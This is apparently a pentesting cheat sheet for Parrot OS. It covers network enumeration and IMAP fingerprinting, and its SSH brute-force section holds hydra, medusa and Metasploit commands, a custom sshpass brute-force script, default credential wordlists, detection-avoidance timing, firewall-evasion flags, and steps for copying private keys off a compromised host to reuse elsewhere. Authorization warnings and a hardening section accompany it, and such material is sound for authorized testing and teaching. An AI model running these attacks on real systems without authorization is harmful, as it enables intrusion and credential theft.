# Parrot OS Pentesting Cheat Sheet

## DNS/Server Name Discovery from IP

### 1. Reverse DNS Lookup (First Try)
```bash
dig -x <IP> +short
host <IP>
nslookup <IP>
```

### 2. NetBIOS/SMB Enumeration (Windows)
```bash
nbtscan <IP>
nmblookup -A <IP>
smbclient -L //<IP> -N
enum4linux -a <IP>
```

### 3. Query Target as DNS Server
```bash
dig @<IP> soa .
dig @<IP> -x <IP> +short
dig @<IP> -t any <zone>
```

### 4. Service Banner Scanning
```bash
nmap -sV -p 53,88,135,139,389,445,3268,3269 <IP>
nmap -sV --script=banner -p 389,445,53 <IP>
nmap -A <IP>  # Aggressive scan
```

### 5. LDAP/AD Queries (Domain Controllers)
```bash
ldapsearch -x -H ldap://<IP> -s base namingcontexts
ldapsearch -x -H ldap://<IP> -b "" -s base "(objectClass=*)"
```

### Quick One-Liner
```bash
dig -x <IP> +short || nmblookup -A <IP> || nmap -sV -p 53,389,445 <IP>
```

---

## File Transfer: Windows 11 → Parrot OS

### Method 1: Remmina RDP Share (Easiest)
```bash
# In Remmina profile:
# 1. Edit connection
# 2. Advanced tab → Enable "Share folder"
# 3. Select Windows folder
# 4. Reconnect

# Files appear at:
ls /media/rdpdrive/
cp /media/rdpdrive/file.sh ~/
chmod +x ~/file.sh
```

### Method 2: Windows SMB Share → Mount on Parrot
```bash
# On Parrot:
sudo apt install cifs-utils -y
sudo mkdir -p /mnt/windows

# Mount Windows share:
sudo mount -t cifs //WINDOWS_IP/sharename /mnt/windows \
  -o username=USER,domain=WORKGROUP,uid=$(id -u),gid=$(id -g)

# Copy files:
cp /mnt/windows/file.sh ~/
chmod +x ~/file.sh

# Unmount:
sudo umount /mnt/windows
```

### Method 3: smbclient (Interactive)
```bash
sudo apt install smbclient -y
smbclient //WINDOWS_IP/sharename -U USERNAME

# In smbclient:
smb> ls
smb> get file.sh
smb> exit
```

### Method 4: SCP from Windows (SSH Required)
```powershell
# From Windows PowerShell:
scp C:\path\to\file.sh user@PARROT_IP:/home/user/

# Custom SSH port:
scp -P 2222 C:\path\to\file.sh user@PARROT_IP:/home/user/
```

```bash
# On Parrot, ensure SSH is running:
sudo systemctl status ssh
sudo systemctl start ssh
```

---

## IMAP Version Detection & Fingerprinting

### Quick Port Scan
```bash
nmap -Pn -sV -p 143,993 <IP>
nmap -Pn -p 143,993 --script=imap-capabilities <IP>
```

### Manual IMAP Connection Tests

#### Port 993 (Implicit TLS)
```bash
printf "A001 CAPABILITY\r\nA002 LOGOUT\r\n" | \
  openssl s_client -crlf -connect <IP>:993 -quiet
```

#### Port 143 (STARTTLS or Plain)
```bash
# Try STARTTLS first:
printf "A001 CAPABILITY\r\nA002 LOGOUT\r\n" | \
  openssl s_client -crlf -starttls imap -connect <IP>:143 -quiet

# Fallback to plaintext:
( printf "A001 CAPABILITY\r\nA002 LOGOUT\r\n"; sleep 1 ) | nc <IP> 143
```

### Complete IMAP Scanner Script
```bash
#!/usr/bin/env bash
# Save as: imap-version-scan.sh
# Usage: ./imap-version-scan.sh ips.txt

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 <ip-list-file>"
  exit 2
fi

IPFILE="$1"
OUTCSV="imap-results.csv"

echo "ip,port,open,probe_method,banner_or_capabilities" > "$OUTCSV"

while IFS= read -r ip; do
  ip=$(echo "$ip" | tr -d '\r\n' | awk '{print $1}')
  [[ -z "$ip" ]] && continue
  echo "==> Scanning $ip"

  nm=$(nmap -Pn -p 143,993 --open -oG - "$ip" 2>/dev/null)

  if ! echo "$nm" | grep -q "Ports:"; then
    echo "$ip,NA,none,nmap,none" >> "$OUTCSV"
    continue
  fi

  for port in 993 143; do
    if echo "$nm" | grep -q "${port}/open"; then
      echo " port $port open on $ip"

      nmap_full=$(nmap -Pn -sV -p "$port" --script=imap-capabilities \
        --script-timeout 10s "$ip" 2>/dev/null || true)

      if [[ "$port" -eq 993 ]]; then
        cap=$(timeout 6 bash -c "printf 'A001 CAPABILITY\r\nA002 LOGOUT\r\n' | \
          openssl s_client -crlf -connect ${ip}:993 -quiet 2>/dev/null" || true)
      else
        cap=$(timeout 6 bash -c "printf 'A001 CAPABILITY\r\nA002 LOGOUT\r\n' | \
          openssl s_client -crlf -starttls imap -connect ${ip}:143 -quiet 2>/dev/null" || true)
        
        if [[ -z "${cap}" ]]; then
          cap=$(timeout 4 bash -c "( printf 'A001 CAPABILITY\r\nA002 LOGOUT\r\n'; sleep 1 ) | \
            nc ${ip} 143 2>/dev/null" || true)
        fi
      fi

      combined=$(printf "%s\n%s\n" "$nmap_full" "$cap" | tr '\n' ' ' | \
        tr -s ' ' | sed 's/,/;/g' | sed 's/\"/'"'"'/g')

      server_hint=$(echo "$combined" | grep -Eoi \
        'dovecot(/[0-9\.]+)?|cyrus imap(v| )[0-9\.]+|courier-imap|exchange|zimbra' | \
        head -n1 || true)

      capability_hint=$(echo "$combined" | grep -Eoi \
        'IMAP4rev1|SASL-IR|ID|ACL|QUOTA|NAMESPACE|THREAD|UIDPLUS|LITERAL+' | \
        tr '\n' ' ' || true)

      if [[ -n "$server_hint" ]]; then
        info="$server_hint ${capability_hint}"
      elif [[ -n "$capability_hint" ]]; then
        info="$capability_hint"
      else
        info="no-info"
      fi

      echo "$ip,$port,open,openssl/nmap,\"$info\"" >> "$OUTCSV"
    fi
  done

done < "$IPFILE"

echo "Done. Results saved to $OUTCSV"
```

### Server Fingerprinting Patterns
```bash
# Common server identifiers in banners/capabilities:
Dovecot         → "Dovecot ready" or "Dovecot/x.x.x"
Cyrus           → "Cyrus IMAP" or "Cyrus-imapd"
Courier         → "Courier-IMAP"
Exchange        → Often minimal banner + specific capability set
UW IMAP         → "IMAP4rev1" with specific tokens
Zimbra          → "Zimbra" in banner
Gmail/Google    → "Gimap ready" or specific capability set
```

### IMAP Capability Tokens (Common)
```
IMAP4rev1       → Standard IMAP4 revision 1
AUTH=PLAIN      → Authentication method
AUTH=LOGIN      → Login authentication
STARTTLS        → TLS upgrade support
SASL-IR         → SASL initial response
UIDPLUS         → UID commands extension
NAMESPACE       → Namespace extension
IDLE            → IDLE command support
LITERAL+        → Non-synchronizing literals
ID              → Implementation ID
THREAD          → Threading support
QUOTA           → Quota management
ACL             → Access Control Lists
```

---

## Essential Nmap Commands

### Quick Scans
```bash
nmap -sn <IP/CIDR>           # Ping scan (host discovery)
nmap -sV <IP>                # Version detection
nmap -O <IP>                 # OS detection
nmap -A <IP>                 # Aggressive (OS, version, scripts, traceroute)
nmap -p- <IP>                # All ports
nmap -F <IP>                 # Fast (top 100 ports)
```

### Service Enumeration
```bash
nmap -sV -p 21,22,23,25,53,80,110,143,443,445,3306,3389,8080,8443 <IP>
nmap -sV --script=default <IP>
nmap -sV --script=banner <IP>
```

### Vulnerability Scanning
```bash
nmap -sV --script=vuln <IP>
nmap --script=smb-vuln* -p 445 <IP>
nmap --script=ssl-* -p 443 <IP>
```

---

## Common Port Reference

| Port | Service | Protocol |
|------|---------|----------|
| 21 | FTP | File Transfer |
| 22 | SSH | Secure Shell |
| 23 | Telnet | Remote Terminal |
| 25 | SMTP | Email Send |
| 53 | DNS | Domain Names |
| 80 | HTTP | Web |
| 110 | POP3 | Email Retrieve |
| 143 | IMAP | Email Access |
| 443 | HTTPS | Secure Web |
| 445 | SMB | File Sharing (Windows) |
| 502 | Modbus | Industrial Control |
| 993 | IMAPS | Secure IMAP |
| 995 | POP3S | Secure POP3 |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote Desktop |
| 8080 | HTTP-Alt | Web (alternate) |
| 8081 | HTTP-Alt | Web (Docker/alternate) |

---

## SSH Brute Force (AUTHORIZED TESTING ONLY)

⚠️ **CRITICAL WARNING:** SSH brute forcing is ILLEGAL without explicit written authorization. Use only on your own systems or authorized penetration testing engagements. Unauthorized access is a criminal offense.

### Method 1: Hydra (Recommended)
```bash
# Install hydra
sudo apt install hydra -y

# Single user, password list
hydra -l username -P passwords.txt ssh://<IP>

# User list, single password
hydra -L users.txt -p password123 ssh://<IP>

# User list + password list (most common)
hydra -L users.txt -P passwords.txt ssh://<IP>

# Custom port
hydra -L users.txt -P passwords.txt ssh://<IP>:2222

# With additional options
hydra -L users.txt -P passwords.txt -t 4 -V -f ssh://<IP>
# -t 4    = 4 parallel tasks (avoid detection/blocking)
# -V      = verbose (show attempts)
# -f      = exit after first valid credential found
```

### Method 2: Medusa
```bash
# Install medusa
sudo apt install medusa -y

# Basic syntax
medusa -h <IP> -U users.txt -P passwords.txt -M ssh

# With options
medusa -h <IP> -U users.txt -P passwords.txt -M ssh -t 4 -f -v 6
# -t 4    = 4 parallel threads
# -f      = stop on first valid credential
# -v 6    = verbose level 6
```

### Method 3: Nmap NSE Script
```bash
# Using nmap's ssh-brute script
nmap -p 22 --script ssh-brute \
  --script-args userdb=users.txt,passdb=passwords.txt <IP>

# With timing
nmap -p 22 --script ssh-brute \
  --script-args userdb=users.txt,passdb=passwords.txt,brute.delay=3s <IP>
```

### Method 4: Metasploit
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP>
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set THREADS 4
set VERBOSE true
run
```

### Method 5: Custom Bash Script
```bash
#!/bin/bash
# ssh-brute.sh - Simple SSH brute force (educational only)

TARGET="$1"
PORT="${2:-22}"
USERS="users.txt"
PASSWORDS="passwords.txt"

if [[ $# -lt 1 ]]; then
  echo "Usage: $0 <IP> [port]"
  exit 1
fi

while IFS= read -r user; do
  while IFS= read -r pass; do
    echo "Trying: $user:$pass"
    
    # Use sshpass (install: apt install sshpass)
    timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
      -o ConnectTimeout=5 -p "$PORT" "$user@$TARGET" "exit" 2>/dev/null
    
    if [[ $? -eq 0 ]]; then
      echo "[SUCCESS] Valid credentials: $user:$pass"
      echo "$user:$pass" >> ssh-valid-creds.txt
      exit 0
    fi
    
    sleep 1  # Rate limiting
  done < "$PASSWORDS"
done < "$USERS"

echo "No valid credentials found"
```

### Creating Wordlists

#### Common Users File (users.txt)
```bash
cat > users.txt <<EOF
root
admin
administrator
user
test
guest
ubuntu
debian
kali
parrot
pi
oracle
postgres
mysql
EOF
```

#### Common Passwords File (passwords.txt)
```bash
cat > passwords.txt <<EOF
password
123456
admin
root
toor
Password1
Admin123
letmein
welcome
qwerty
abc123
EOF
```

#### Generate Custom Wordlists
```bash
# Using crunch (install: apt install crunch)
crunch 6 8 -t pass@@@@ -o passwords.txt
# Generates: pass0000, pass0001, ... pass9999

# Using cupp (Common User Passwords Profiler)
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i  # Interactive mode

# Download SecLists (huge collection)
git clone https://github.com/danielmiessler/SecLists.git
# Users: SecLists/Usernames/
# Passwords: SecLists/Passwords/
```

### Best Practices for Testing

#### 1. Rate Limiting (Avoid Detection)
```bash
# Slow and stealthy
hydra -L users.txt -P passwords.txt -t 1 -w 10 ssh://<IP>
# -t 1 = 1 thread only
# -w 10 = 10 second timeout

# Add delays between attempts
for user in $(cat users.txt); do
  for pass in $(cat passwords.txt); do
    hydra -l $user -p $pass ssh://<IP>
    sleep 5
  done
done
```

#### 2. Logging and Output
```bash
# Save results to file
hydra -L users.txt -P passwords.txt ssh://<IP> -o results.txt

# Detailed logging
hydra -L users.txt -P passwords.txt ssh://<IP> 2>&1 | tee hydra.log
```

#### 3. Testing Single Credential
```bash
# Quick test before full brute force
sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@<IP>

# Or with expect
expect << EOF
spawn ssh user@<IP>
expect "password:"
send "password\r"
expect eof
EOF
```

### Defense Against SSH Brute Force

#### Monitor Failed Attempts
```bash
# View failed SSH attempts
sudo grep "Failed password" /var/log/auth.log | tail -20

# Count failed attempts by IP
sudo grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
```

#### Implement Fail2Ban
```bash
# Install
sudo apt install fail2ban -y

# Configure
sudo nano /etc/fail2ban/jail.local

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

# Restart
sudo systemctl restart fail2ban
sudo fail2ban-client status sshd
```

#### SSH Hardening
```bash
# Edit SSH config
sudo nano /etc/ssh/sshd_config

# Recommended settings:
PermitRootLogin no
PasswordAuthentication no  # Use keys only
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
Port 2222  # Non-standard port
AllowUsers specificuser

# Restart SSH
sudo systemctl restart sshd
```

### Troubleshooting

#### "Too many authentication failures"
```bash
# SSH limits attempts, add to ~/.ssh/config:
Host *
  IdentitiesOnly yes
  PreferredAuthentications password

# Or use -o option:
ssh -o PreferredAuthentications=password user@<IP>
```

#### Connection Timeout Issues
```bash
# Increase timeout
hydra -L users.txt -P passwords.txt -w 30 ssh://<IP>

# Test connectivity first
nc -zv <IP> 22
nmap -p 22 <IP>
```

#### Rate Limiting / Blocking
```bash
# Your IP might be blocked, check:
# 1. Test from different IP
# 2. Wait (bans are usually temporary)
# 3. Use VPN/proxy (only if authorized)

# Check if blocked
telnet <IP> 22
# If no response = likely blocked
```

---

## SSH Key-Based Authentication (Alternative to Brute Force)

### Generate SSH Keys
```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_pentest
```

### Copy Key to Target (if you have password)
```bash
ssh-copy-id -i ~/.ssh/id_rsa_pentest.pub user@<IP>
```

### Test Key Authentication
```bash
ssh -i ~/.ssh/id_rsa_pentest user@<IP>
```

### Extract Keys from Compromised System
```bash
# Copy private keys
scp user@<IP>:/home/user/.ssh/id_rsa ./stolen_key
chmod 600 ./stolen_key

# Try the stolen key
ssh -i ./stolen_key user@<OTHER_IP>
```

---

## Tips & Warnings

### Authorization
- Only scan networks/hosts you own or are authorized to test
- Obtain written permission before pentesting
- Follow responsible disclosure practices

### Rate Limiting
```bash
# Slow scans to avoid detection/blocking
nmap --max-rate 10 <IP>
nmap -T2 <IP>  # Polite timing

# Add delays between requests
for ip in $(cat ips.txt); do 
  nmap $ip
  sleep 5
done
```

### Firewall Evasion
```bash
nmap -Pn <IP>                    # Skip ping (assume host is up)
nmap -f <IP>                     # Fragment packets
nmap -D RND:10 <IP>              # Decoy scan
nmap --source-port 53 <IP>       # Source port manipulation
```

### Output Formats
```bash
nmap -oN output.txt <IP>         # Normal
nmap -oX output.xml <IP>         # XML
nmap -oG output.grep <IP>        # Grepable
nmap -oA output <IP>             # All formats
```

---

## Quick References

### Find Windows IP (PowerShell)
```powershell
ipconfig | findstr IPv4
```

### Find Parrot IP
```bash
ip addr show
hostname -I
```

### Enable SSH on Parrot
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
sudo systemctl status ssh
```

### Create IP List File
```bash
echo "192.168.1.1" > ips.txt
echo "192.168.1.2" >> ips.txt
# Or generate range:
nmap -sL 192.168.1.0/24 | grep "Nmap scan" | awk '{print $5}' > ips.txt
```

### Make Scripts Executable
```bash
chmod +x script.sh
./script.sh
```

---

## Troubleshooting

### "Permission denied" errors
```bash
sudo <command>  # Run with elevated privileges
```

### "Command not found"
```bash
# Install missing tools:
sudo apt update
sudo apt install nmap openssl cifs-utils smbclient nbtscan
```

### SMB mount fails
```bash
# Try specifying SMB version:
sudo mount -t cifs //IP/share /mnt/windows -o vers=3.0,username=USER
```

### SSH connection refused
```bash
# Check if SSH is running:
sudo systemctl status ssh
sudo systemctl restart ssh

# Check firewall:
sudo ufw status
sudo ufw allow 22/tcp
```

---

**Remember:** All pentesting activities should only be performed on systems you own or have explicit written authorization to test.